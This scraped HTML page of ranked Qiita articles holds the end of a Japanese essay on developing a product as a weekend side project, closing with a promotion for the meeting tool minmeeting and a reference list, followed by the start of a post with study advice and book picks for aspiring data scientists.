<p>そして、ある程度<b>製品のイメージが固まってきた時点で再び現場に</b>行き、自分が作ろうとしている製品・サービスがあったらどのように使われて、何が良くなるだろうかということを、観察しながら<b>何度も思考実験</b>を繰り返します。</p>

<h2>
<span id="効果を明確にし効果を出すための具体策を考える" class="fragment"></span><a href="#%E5%8A%B9%E6%9E%9C%E3%82%92%E6%98%8E%E7%A2%BA%E3%81%AB%E3%81%97%E5%8A%B9%E6%9E%9C%E3%82%92%E5%87%BA%E3%81%99%E3%81%9F%E3%82%81%E3%81%AE%E5%85%B7%E4%BD%93%E7%AD%96%E3%82%92%E8%80%83%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>効果を明確にし、効果を出すための具体策を考える</h2>

<p><b>その製品を使うとどのような効果があるのか</b>、狙っている効果を明確にしましょう。コンセプトだけではダメで、<b>具体的にどうやってその効果を出すのか</b>を明確にします。<b>キーとなるアイディアが見つかるまで、実験とアイディア出し</b>を続けましょう。</p>

<p>例えば、世界的に有名になったビジネスチャットツールのslackでは、少し前まで「忙しさを減らす」というようなコンセプトを打ち出していたと思います。「忙しさを減らす」ために、まずはgithubやjenkinsやtrelloなど様々なシステムと連携できるAPIを充実させて、チームで作業する際の雑務を自動化できる状態にしました。そして、自動化するプログラムを作ってくれるエンジニアをターゲットに普及させることで、多くのシステムと簡単に連携できるようになりました。現在では、エンジニアでなくてもいろいろとシステムをつなぎ合わせて作業を効率化できるようになっています。（slackの内部事情はよく知りませんが、外から使っているとそのように見えました。）</p>

<p>このように効果を出すための具体的な道筋を作ることで、ユーザに価値を届けることができます。</p>

<h2>
<span id="類似品代替を調査しそれと何が違うのかを明確にする" class="fragment"></span><a href="#%E9%A1%9E%E4%BC%BC%E5%93%81%E4%BB%A3%E6%9B%BF%E3%82%92%E8%AA%BF%E6%9F%BB%E3%81%97%E3%81%9D%E3%82%8C%E3%81%A8%E4%BD%95%E3%81%8C%E9%81%95%E3%81%86%E3%81%AE%E3%81%8B%E3%82%92%E6%98%8E%E7%A2%BA%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>類似品・代替を調査し、それと何が違うのかを明確にする</h2>

<p>ここまでいくと、製品のアウトラインはおおよそイメージできるようになっているはずです。では、その自分がイメージする<b>製品の類似品や代替品</b>が世の中にないかを調査しておきましょう。</p>

<p>Googleで検索するだけでもよいですが、<b>他人に自分がつくりたいものを説明してみる</b>と、相手は「○○みたいなもの？」と質問してくるでしょう。人間は自分が知らないものを創造するときに、自分が既に知っているものから類推することしかできないからです。その「○○」は、ときに的外れですが、たまに自分が気づきもしなかったような類似品や代替品を教えてくれることがあります。</p>

<p>たいてい類似品・代替品が見つかります。その場合は、類似品・代替品と<b>何が違うのかを明確に</b>しておきましょう。もし類似品・代替品が一切見つからない場合は、世紀の大発見か、世の中に需要がないクソアイディアかのどちらかでしょう。</p>

<h2>
<span id="少しだけ新鮮味を加える" class="fragment"></span><a href="#%E5%B0%91%E3%81%97%E3%81%A0%E3%81%91%E6%96%B0%E9%AE%AE%E5%91%B3%E3%82%92%E5%8A%A0%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>少しだけ新鮮味を加える</h2>

<p>世の中には似たような製品が溢れかえっています。中には絶対にパクったとしか思えないような類似機能や見た目の製品もよく目にします。</p>

<p>そのような状況を目の当たりにすると、既存の成功した製品をそのままパクって作れば、高確率で成功できるのではないかという考えがよぎります。</p>

<p>確かに市場のトッププレーヤーが下位の競合製品の機能をパクることはよくありますが、それは下位の競合製品の特徴を消すためで、パクったら売れそうだからというバカな理由でやっている訳ではないと思います（そう信じたい）。</p>

<p>週末在宅ワークは一般的な企業と比べて超ローコストで開発ができるため、そのローコストを活かして既存製品をパクって低価格で売るという戦略もありえます。しかし、それで万一成功して事業を拡大しようとすると、オペレーションコストも増大するため、優位な価格が維持できなくなります。成功したら破綻するという賢くない戦略でしょう。</p>

<p>また、<b>既に世の中にあるものを、そのままパクって作っても意味がありません</b>。新たに製品を作るのだから、最低限一つは<b>何か新しいもの（新鮮味）がなければなりません</b>。</p>

<p>プライベートな時間を使ってわざわざ世の中に製品を出すのだから、泥棒のような姑息な戦略はとらず、<b>エンジニアとして誇りを持てるような製品</b>を作っていきましょう。</p>

<h2>
<span id="馴染みのある見た目にする" class="fragment"></span><a href="#%E9%A6%B4%E6%9F%93%E3%81%BF%E3%81%AE%E3%81%82%E3%82%8B%E8%A6%8B%E3%81%9F%E7%9B%AE%E3%81%AB%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>馴染みのある見た目にする</h2>

<p>デザイナーというと、奇抜でカッコイイ絵を描く人のように思うかもしれません。しかし、プロのデザイナーの作品をよく観察して見ると、現代アートのような奇抜な作品はほとんどなく、どこかで見たことがあるような分かりやすくて安心感のある見た目が多いのではないでしょうか。</p>

<p><b>見た目</b>は、購買などの意思決定をする際には<b>重要な要素</b>です。例えば、見るからにパン屋さんという見た目のお店であれば、初めてのところでも何の店か分かりやすく気兼ねなく入って買い物をすることができますが、民家に「パン工房」という看板だけ出ているような店構えだと、入っていいのかもわからないし、一般人にパンを売っているのかさえわからず躊躇してしまいます。</p>

<p>Webサイトや製品の見た目も同じことが言えて、<b>ユーザーに安心をして使ってもらうためには、ある程度目的に応じた馴染みのなる見た目にする必要</b>があります。</p>

<p>常識を壊すような新しい製品であっても、ユーザーが理解できるような見た目でなければなりません。</p>

<h2>
<span id="プロトタイプを素早く作って実際に使ってもらう" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%83%88%E3%82%BF%E3%82%A4%E3%83%97%E3%82%92%E7%B4%A0%E6%97%A9%E3%81%8F%E4%BD%9C%E3%81%A3%E3%81%A6%E5%AE%9F%E9%9A%9B%E3%81%AB%E4%BD%BF%E3%81%A3%E3%81%A6%E3%82%82%E3%82%89%E3%81%86"><i class="fa fa-link"></i></a>プロトタイプを素早く作って、実際に使ってもらう</h2>

<p>作るものが決まったら、時間をかけて作り込む前に、<b>製品のコンセプトとなる部分を最低限作ってみて、想定ユーザーに実際に使ってもらい</b>ましょう。</p>

<p>この時点では、品質は不十分でしょうから、理解のある身近な人に協力してもらうのがよいでしょう。</p>

<p>実際に使い始めると、いろんなことが見えてきます。不便な点、足りない点、思った以上に受けが良い点などが多数挙がると思います。それらを改善しながら、<b>当初想定していた価値があるか否かを検証</b>します。</p>

<p>ある程度価値がありそうだという段階まで来たら、今度は<b>想定顧客に使ってもらい</b>ます。ここでは人数を増やすことよりも、少人数の人に実際の利用環境でヘビーに使ってもらって、意図した<b>効果が存分に発揮できるようになるまで改善することに集中</b>しましょう。</p>

<p>このフェーズでは、とにかく時間とお金をあまりかけずに<b>素早く試すことがポイント</b>です。ただし、乱暴な顧客実験は顧客の信頼を失うことにつながるため、<b>事前・事後の十分な説明</b>を心がけて、勝手過ぎるサービス変更や停止は避けましょう。</p>

<h2>
<span id="適度に品質を高める" class="fragment"></span><a href="#%E9%81%A9%E5%BA%A6%E3%81%AB%E5%93%81%E8%B3%AA%E3%82%92%E9%AB%98%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>適度に品質を高める</h2>

<p>あるマーケティング会社の調査によると、顧客が製品を支持・推奨するかどうかに最も重要な影響を及ぼすのは、<b>顧客の目から見た品質</b>だった<sup id="fnref13"><a href="#fn13" rel="footnote" title="Eric Almquist, John Senior, Nicolas Bloch、『すべての商品・サービスに通用する　顧客がほしいと思う30の価値要素』、2017年3月、Diamond Harvard Business Review 顧客は何にお金を払うのか。">13</a></sup>そうです。</p>

<p>日本の企業の多くがこれまで過剰品質によって生産性を下げてきたという意見もありますが、結局<b>あたり前レベルの品質はいずれにしろ求められる</b>ことになります。</p>

<p><b>「顧客の目から見た品質」</b>というのが曲者で、顧客にもいろんな人がいるため、様々な使い方において、かなり多角的に品質を評価する必要があります。製品の仕様をよく知っている人が、多角的に評価をするのにも限りがあるため、<b>「顧客の目」を借りられるような仕組み</b>づくりが重要です。</p>

<p>具体的には、<b>パイロットユーザ（この時点では数百名程度を想定）</b>に、実際に使ってもらいながら、<b>アンケート</b>を実施したり、<b>顧客の実際に取った行動を計測</b>していきます。例えば、一度製品を使ってみたユーザが<b>どのくらい使い続けているか</b>とか、製品を使った人がTwitter等の<b>SNSでどのくらい拡散してくれているか</b>といった行動を計測し、評価します。</p>

<p>あまり継続率が低いようだと、ユーザの期待に答えていない可能性が高く、機能性や品質に問題があるかもしれません。他方でSNSによる拡散が多いと、人に進めたいくらいすばらしいと感じていると推定できます。拡散された情報を受け取る人の数×情報を受けた人が使い始める確率が1を超えれば、その製品は自動的に広まっていくため、そこまでいけば拡販に向けた準備にシフトできます。</p>

<h2>
<span id="効果的にユーザに届ける道をつくる" class="fragment"></span><a href="#%E5%8A%B9%E6%9E%9C%E7%9A%84%E3%81%AB%E3%83%A6%E3%83%BC%E3%82%B6%E3%81%AB%E5%B1%8A%E3%81%91%E3%82%8B%E9%81%93%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B"><i class="fa fa-link"></i></a>効果的にユーザに届ける道をつくる</h2>

<p>製品がある程度できたら、一気に<b>広告や営業</b>をかけて拡販路線に舵を切りたくなりますが、<b>焦りは禁物</b>です。</p>

<p>初期段階においては、まずは<b>顧客がその製品をどのように使用するのか</b>を学習し、<b>製品そのものと戦略の完成度を高めることに集中</b>するのがよいでしょう。その内容に応じて、<b>製品・ポジショニング・宣伝活動・販促資料などに微調整</b>をかけていきます<sup id="fnref14"><a href="#fn14" rel="footnote" title="Mark Leslie, Charles A. Holloway、『組織学習を加速させる　営業学習曲線のマネジメント』、2006年10月、Diamond Harvard Business Review 最強の営業力。">14</a></sup>。</p>

<p>マーケティング・営業プロセスの微調整の際は、<b>顧客に会いに行って話を聞いたり観察をしたりするのが基本</b>です。その上で、<b>カスタマージャーニーマップ</b>などを用いて、想定顧客がどのようにしてその製品を知り、使い始め、使い続けるのかを整理し、各段階での<b>問題点を洗い出し</b>てみます。その中で<b>重要なもの</b>については、実際に<b>顧客の行動を計測</b>してみましょう。システマチックに計測できない場合は、人力で聞いて回るのでも構いません。</p>

<p>もちろん、準備が整うまで営業をするなという意味ではありません。すべての問題が解消するまで何もしないというのは最悪なパターンです。焦らず<b>改善を続けて、拡販して効果が出る状態になってから拡販に予算をつぎ込む</b>のがよいという意味です。</p>

<h2>
<span id="協力者が参加しやすいようビジョンと受け口をつくる" class="fragment"></span><a href="#%E5%8D%94%E5%8A%9B%E8%80%85%E3%81%8C%E5%8F%82%E5%8A%A0%E3%81%97%E3%82%84%E3%81%99%E3%81%84%E3%82%88%E3%81%86%E3%83%93%E3%82%B8%E3%83%A7%E3%83%B3%E3%81%A8%E5%8F%97%E3%81%91%E5%8F%A3%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B"><i class="fa fa-link"></i></a>協力者が参加しやすいよう、ビジョンと受け口をつくる</h2>

<p>製品・サービスの立ち上げ時期は、とにかくやることが多く、一人では手に負えないこともあるでしょう。しかし、まだ資金が潤沢にある訳ではないため、ほとんど手弁当で協力をしてもらうことが多々あると思います。</p>

<p>そんな際は、手弁当でも<b>協力する価値がある</b>ことを示すために、きちんと<b>事業のビジョンは明確に</b>しておきましょう。</p>

<p>また、githubやslackやgoogle appsなどの<b>コラボレーションツールを準備</b>して、<b>協力者が貢献をしやすいような仕組み</b>を揃えておきましょう。</p>

<p><b>※毎日ちょっとずつ工夫を追加していく予定ですので、今後もぜひご期待ください。</b></p>

<p>つづく。。。</p>

<h1>
<span id="minmeetingのご案内" class="fragment"></span><a href="#minmeeting%E3%81%AE%E3%81%94%E6%A1%88%E5%86%85"><i class="fa fa-link"></i></a>minmeetingのご案内</h1>

<p>「<b>10分で生産的なミーティング</b>」を目指して、<b>minmeeting</b>の開発を進めています。まだまだ不足は多いですが、なんとなくコンセプトは感じ取れるようなレベルにはなってきたのではないかと思います。googleやgithubのアカウントがあれば、<b>無料で使えます</b>。ミーティングの生産性に課題意識をお持ちの場合は、ぜひお試しください。</p>

<h3>
<span id="minmeetingログイン画面" class="fragment"></span><a href="#minmeeting%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E7%94%BB%E9%9D%A2"><i class="fa fa-link"></i></a>minmeetingログイン画面</h3>

<p><a href="https://x.minmeeting.com" class="autolink" rel="nofollow noopener" target="_blank">https://x.minmeeting.com</a><br>
<a href="https://x.minmeeting.com" rel="nofollow noopener" target="_blank"><img width="500px" alt="minmeetingログイン画面" src="https://camo.qiitausercontent.com/c7a4a5dbd3e152797ae0a40282204dde1e967abf/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139393530362f31333433303131632d323962392d623537362d663635652d6531643266653030356566332e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/199506/1343011c-29b9-b576-f65e-e1d2fe005ef3.png"></a></p>

<h3>
<span id="minmeetingのtwitterページはこちら" class="fragment"></span><a href="#minmeeting%E3%81%AEtwitter%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AF%E3%81%93%E3%81%A1%E3%82%89"><i class="fa fa-link"></i></a>minmeetingのTwitterページはこちら</h3>

<p><a href="https://twitter.com/minmeeting" class="autolink" rel="nofollow noopener" target="_blank">https://twitter.com/minmeeting</a><br>
会議や生産性に関する情報発信を行っています。<br>
もしよろしければTwitterのフォローをお願いします。</p>

<h1>
<span id="参考文献" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><i class="fa fa-link"></i></a>参考文献</h1>

<div class="footnotes">
<hr>
<ol>

<li id="fn1">
<p><a href="http://it.impressbm.co.jp/articles/-/10079" rel="nofollow noopener" target="_blank">IT技術者の約半数は週の学習時間が3時間未満～「情報に対する意欲」を考える</a> <a href="#fnref1">↩</a></p>
</li>

<li id="fn2">
<p><a href="http://paiza.hatenablog.com/entry/2014/09/16/IT%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%81%AE%E5%8B%89%E5%BC%B7%E6%99%82%E9%96%93%E3%81%AF%E6%9C%8820%E6%99%82%E9%96%93%E4%BB%A5%E4%B8%8A%EF%BC%81%EF%BC%9F%E5%A5%BD%E3%81%8D%E3%81%AA%E3%81%93" rel="nofollow noopener" target="_blank">ITエンジニアの勉強時間は月20時間以上！？好きなことして生きる方法</a> <a href="#fnref2">↩</a></p>
</li>

<li id="fn3">
<p><a href="https://www.nhk.or.jp/bunken/research/yoron/pdf/20160501_8.pdf" rel="nofollow noopener" target="_blank">国民生活時間調査　2015</a> <a href="#fnref3">↩</a></p>
</li>

<li id="fn4">
<p>堀忠雄、『快適睡眠のすすめ (岩波新書)』、岩波新書、2000年7月。 <a href="#fnref4">↩</a></p>
</li>

<li id="fn5">
<p><a href="http://news.livedoor.com/article/detail/12867237/" rel="nofollow noopener" target="_blank">コーヒーで眠気をとばすとヤバイ これだけの理由</a> <a href="#fnref5">↩</a></p>
</li>

<li id="fn6">
<p>一川誠、『時間の使い方を科学する　思考は10時から14時、記憶は16時から20時』、2016年7月、PHP新書。 <a href="#fnref6">↩</a></p>
</li>

<li id="fn7">
<p>池谷裕二、『記憶力を強くする―最新脳科学が語る記憶のしくみと鍛え方 (ブルーバックス) 新書』、2001年1月、講談社。 <a href="#fnref7">↩</a></p>
</li>

<li id="fn8">
<p><a href="https://www.lifehacker.jp/2013/01/130125hungry_memory.html" rel="nofollow noopener" target="_blank">「記憶力は空腹状態で向上する」という研究結果</a> <a href="#fnref8">↩</a></p>
</li>

<li id="fn9">
<p><a href="https://www.businessinsider.jp/post-106010" rel="nofollow noopener" target="_blank">座りすぎの死亡リスクは最大40％増——日本人は世界一座りすぎている</a> <a href="#fnref9">↩</a></p>
</li>

<li id="fn10">
<p>ハーバート・ベンソン、『ストレスの効果を最大限に生かす　ブレークアウト原則の科学』、2006年12月、Diamond Harvard Business Review。 <a href="#fnref10">↩</a></p>
</li>

<li id="fn11">
<p><a href="https://www.lifehacker.jp/2010/08/post_1571.html" rel="nofollow noopener" target="_blank">マルチモニターは生産性を向上させる、というのは「神話」なのか、本当なのか？</a> <a href="#fnref11">↩</a></p>
</li>

<li id="fn12">
<p><a href="http://www.taisei.co.jp/giken/report/2010_43/paper/A043_054.pdf" rel="nofollow noopener" target="_blank">照明計画と知的生産性に関する研究</a> <a href="#fnref12">↩</a></p>
</li>

<li id="fn13">
<p>Eric Almquist, John Senior, Nicolas Bloch、『すべての商品・サービスに通用する　顧客がほしいと思う30の価値要素』、2017年3月、Diamond Harvard Business Review 顧客は何にお金を払うのか。 <a href="#fnref13">↩</a></p>
</li>

<li id="fn14">
<p>Mark Leslie, Charles A. Holloway、『組織学習を加速させる　営業学習曲線のマネジメント』、2006年10月、Diamond Harvard Business Review 最強の営業力。 <a href="#fnref14">↩</a></p>
</li>

</ol>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">30位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>315</kbd>
		<a target="_blank" href="https://qiita.com/KIKUYA-Takumi/items/531edd4e62c3e14a6d08">データサイエンティストを目指して半年で学んだことまとめ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-28<br />06:19:26</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/148136.html">KIKUYA-Takumi</a>(9件の記事)<br><img width="80" height="80" src="https://avatars.githubusercontent.com/u/19384637?v=3">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[R]</b> <b>[機械学習]</b> <b>[ポエム]</b> <b>[データ分析]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>本記事では、データサイエンティストを目指して勉強した半年間で学んだこと、気付いたことをまとめます。これからデータサイエンティストを目指して勉強する人の参考になればと思います。</p>

<h1>
<span id="最初の一手" class="fragment"></span><a href="#%E6%9C%80%E5%88%9D%E3%81%AE%E4%B8%80%E6%89%8B"><i class="fa fa-link"></i></a>最初の一手</h1>

<p>個人的にではありますが、最初はアプローチの理解から始めると思いますが、<strong>数式</strong>と<strong>プログラミング</strong>の両方を勉強する方が良いと思います。<strong><font color="blue">数式→プログラミング or プログラミング→数式</font></strong>の順序はどちらでも良いと思いますが、<strong><font color="red">プログラミング（フレームワーク）のみ</font></strong>はやめた方が良いと思います。出力結果の解釈で苦労することになるので、理論、数式はしっかり理解した方が良いです。</p>

<p>プログラミング、フレームワークの力で、機械学習ができるのは事実ですが、作ったモデルや予測結果の説明ができなければ価値がありません。</p>

<p>そして、モデルは作るだけでなく、評価・改善していく必要があります。その際に、グリッドサーチのようにモデルのパラメータを最適化すべきなのか、学習データを見直さないといけないのか判断しなければなりません。パラメータの最適化であれば、プログラミングで対処できますが、データの見直しは数理統計の知見が必要になります。理論もしっかり勉強しましょう。</p>

<h1>
<span id="アプローチドリブンではなくデータドリブン" class="fragment"></span><a href="#%E3%82%A2%E3%83%97%E3%83%AD%E3%83%BC%E3%83%81%E3%83%89%E3%83%AA%E3%83%96%E3%83%B3%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%8F%E3%83%87%E3%83%BC%E3%82%BF%E3%83%89%E3%83%AA%E3%83%96%E3%83%B3"><i class="fa fa-link"></i></a>アプローチドリブンではなく、データドリブン</h1>

<p><a href="https://camo.qiitausercontent.com/4d1421b516f7f0ccf5692ceed49a70d8d706a227/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f65303138623938312d613863352d613438332d613865382d3633613332333937623330312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4d1421b516f7f0ccf5692ceed49a70d8d706a227/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f65303138623938312d613863352d613438332d613865382d3633613332333937623330312e706e67" alt="データ.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/e018b981-a8c5-a483-a8e8-63a32397b301.png"></a></p>

<p>モデルの精度を上げるために、アプローチだけで解決しようという考えではすぐに限界がきます。これまで、サポートベクターマシーン、決定木、ニューラルネットワーク（CNN、RNN含む）を勉強して思ったのが、<strong><font color="red">アプローチ第一ではない</font></strong>ということです。</p>

<p>モデルの精度を上げるために、<strong>「とりあえず、Deep Learningで！」</strong>や<strong>「分類問題を解くならSVM！」</strong>等、アプローチだけに気をとられていると、すぐに精度があがらなくなります。勿論、納得できる良い精度は出ません。</p>

<p>この理由は、機械学習は<strong>データ</strong>からパターンを見出しているからです。精度を上げるためにはモデルではなく、データに対してより多くの時間をかける必要があります。実際、データクレンジング、データ加工等、いわゆる前処理に全体の<strong>約8割</strong>を費やすと言われています。このことからもアプローチではなくデータであることがわかります。</p>

<p>アプローチよりデータドリブンと書きましたが、最近は<strong><font color="blue">「課題解釈」</font></strong>も重要ではないかと感じています。データ分析して明らかにしたいこと、予測したいことを正確に解釈した上で、データの処理、モデル作成・評価の流れになるので、最初に解決したい課題の解釈を誤ると分析全体がおかしな方向へ進んでしまうからです。</p>

<h1>
<span id="次への一手" class="fragment"></span><a href="#%E6%AC%A1%E3%81%B8%E3%81%AE%E4%B8%80%E6%89%8B"><i class="fa fa-link"></i></a>次への一手</h1>

<p>一連の流れを経験できたら、次は<strong>複数のアプローチを習得</strong>したいのか、<strong>一つのアプローチを追究</strong>したいのかを決めれば良いと思います。</p>

<p>活躍できる幅を広げたいなら、複数のアプローチを習得して、課題や状況に応じて使い分けられるように勉強すれば良いと思います。業界、分野を問わずデータ分析したい人はこちらかなと思います。</p>

<p>一方、自社、自部門の分析担当等、特定の業界、分野限定でデータ分析をする人は一つアプローチを追究する方が良いのかなと思います。現状、万能なアルゴリズムはまだ存在しないので、課題に対して成果が報告されているアプローチに絞って勉強する方が効率的だと思います。</p>

<h1>
<span id="使用した参考書" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9F%E5%8F%82%E8%80%83%E6%9B%B8"><i class="fa fa-link"></i></a>使用した参考書</h1>

<h2>
<span id="データサイエンス" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%82%B5%E3%82%A4%E3%82%A8%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>データサイエンス</h2>

<p><strong>ゼロからはじめるデータサイエンス</strong><br>
<a href="https://camo.qiitausercontent.com/8782d8a1ff628a7905ed27125685ab45082474ed/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f35343763336236652d616365662d373730642d666439632d3239316536333038623263372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8782d8a1ff628a7905ed27125685ab45082474ed/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f35343763336236652d616365662d373730642d666439632d3239316536333038623263372e706e67" alt="ゼロからはじめるデータサイエンス.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/547c3b6e-acef-770d-fd9c-291e6308b2c7.png"></a><br>
データサイエンスの入門書。コードを書きながらアプローチを理解できる１冊。多くのアプローチがあるので、勉強したいアプローチのはじめの一歩としてこの本で勉強するとアプローチの感覚がつかめるでしょう。</p>

<p><strong>Pythonによるデータ分析入門</strong><br>
<a href="https://camo.qiitausercontent.com/86972317c85e247a710db3466fee6c3ba0e1b9ed/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f62313332656136312d393032622d646230622d326232612d3065663165316633623036372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/86972317c85e247a710db3466fee6c3ba0e1b9ed/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f62313332656136312d393032622d646230622d326232612d3065663165316633623036372e706e67" alt="Pythonによるデータ分析入門.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/b132ea61-902b-db0b-2b2a-0ef1e1f3b067.png"></a></p>

<p>NumpyやPandas、Matplotlib等、機械学習でモデルを作る前にやるべきことが学べる１冊。データの処理を勉強したいときに手元にあるとうれしい。</p>

<p><strong>Pythonではじめるデータラングリング</strong><br>
<a href="https://camo.qiitausercontent.com/0bd62ade5a3d6b96721eaea84a9bdd97bd5ef95e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f31383763366337382d373963362d623165302d333464632d3261303663626365303435622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0bd62ade5a3d6b96721eaea84a9bdd97bd5ef95e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f31383763366337382d373963362d623165302d333464632d3261303663626365303435622e706e67" alt="Pythonではじめるデータラングリング.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/187c6c78-79c6-b1e0-34dc-2a06cbce045b.png"></a><br>
もはや辞書。ExcelやPDF等、データを抽出するときに頼りになると思われる。実はあまり読んでいない。</p>

<h2>
<span id="機械学習" class="fragment"></span><a href="#%E6%A9%9F%E6%A2%B0%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a>機械学習</h2>

<p><strong>Pythonではじめる機械学習</strong><br>
<a href="https://camo.qiitausercontent.com/64f0a8018287ec72b7a1f2c9380e84ee6992a8ab/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f66653539303131392d373464662d393735352d313963362d3630356334396137653533362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/64f0a8018287ec72b7a1f2c9380e84ee6992a8ab/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f66653539303131392d373464662d393735352d313963362d3630356334396137653533362e706e67" alt="Pythonではじめる機械学習.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/fe590119-74df-9755-19c6-605c49a7e536.png"></a><br>
Pythonで機械学習の勉強をはじめるならおすすめしたい１冊。画像にはありませんが、帯に<strong>ニューラルネットを学ぶその前に</strong>と書いてあるのが印象的です。アプローチだけでなく、チューニング方法も学べます。</p>

<p><strong>Python機械学習プログラミング</strong><br>
<a href="https://camo.qiitausercontent.com/f7994e4e52a1822582d3d706b0a45c92c4b3246e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f32316435323365662d633036372d626464652d636462332d3365356336303864393232342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f7994e4e52a1822582d3d706b0a45c92c4b3246e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f32316435323365662d633036372d626464652d636462332d3365356336303864393232342e706e67" alt="Python機械学習プログラミング.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/21d523ef-c067-bdde-cdb3-3e5c608d9224.png"></a><br>
こちらもPythonで機械学習を勉強をするなら良いかもしれません。ただ、数式が苦手な人には抵抗があるかもしれません。</p>

<h2>
<span id="深層学習deep-learning" class="fragment"></span><a href="#%E6%B7%B1%E5%B1%A4%E5%AD%A6%E7%BF%92deep-learning"><i class="fa fa-link"></i></a>深層学習・Deep Learning</h2>

<p><strong>ゼロから作るDeep Learning</strong><br>
<a href="https://camo.qiitausercontent.com/a4f91e8f60d1f45da77a4f154f1711266eb4d5d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f61663166613135652d376563362d633732622d643632352d3534663562613632363161352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a4f91e8f60d1f45da77a4f154f1711266eb4d5d0/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f61663166613135652d376563362d633732622d643632352d3534663562613632363161352e706e67" alt="ゼロから作るDeepLearrning.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/af1fa15e-7ec6-c72b-d625-54f5ba6261a5.png"></a><br>
Deep Learning、Neural Networkの計算方法から実装まで学べる本。この本を理解できないようであれば、数学の復習をおすすめします。</p>

<p><strong>深層学習</strong><br>
<a href="https://camo.qiitausercontent.com/e90339d3547d3e01ad33b766f9efb772b93fb817/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f35643865333031642d306162342d643763652d366466312d3534316162313037383638342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e90339d3547d3e01ad33b766f9efb772b93fb817/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3134383133362f35643865333031642d306162342d643763652d366466312d3534316162313037383638342e706e67" alt="深層学習.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/148136/5d8e301d-0ab4-d7ce-6df1-541ab1078684.png"></a><br>
こちらは理論の本。この本を理解、説明できるならば<strong>深層学習知ってます！</strong>と言っても良いのではないでしょうか。</p>

<h2>
